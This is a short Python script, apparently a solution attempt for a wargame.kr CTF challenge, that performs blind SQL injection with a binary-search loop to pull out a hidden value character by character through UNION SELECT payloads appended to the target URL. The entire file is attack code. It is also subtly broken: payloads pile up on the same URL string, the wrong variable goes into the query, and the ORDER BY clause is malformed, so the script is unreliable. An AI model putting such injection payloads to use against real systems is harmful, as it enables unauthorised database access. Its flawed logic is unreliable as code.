from requests import *
url='http://wargame.kr:8080/zairo?pw=&flag=abs&id=zairowkdlfhdkel\''
start=33
end=90
pivot=int((90+33)/2)
result=''
test=''
for i in range(30):
    for j in range(8):
        test=result+chr(pivot)
        payload=f' union select 1,2,3,{result},5 order by asc %23'
        url+=payload
        response=get(url=url)
        if response.text.find('2') != -1:
            start=pivot+1
            pivot=int((start+end)/2)
        else:
            end=pivot
            pivot=int((start+end)/2)
        if start==end:
            result+=chr(start)
            print(result)
            start=33
            end=90
            pivot=int((90+33)/2)
            break
result=result.lower()
print(result)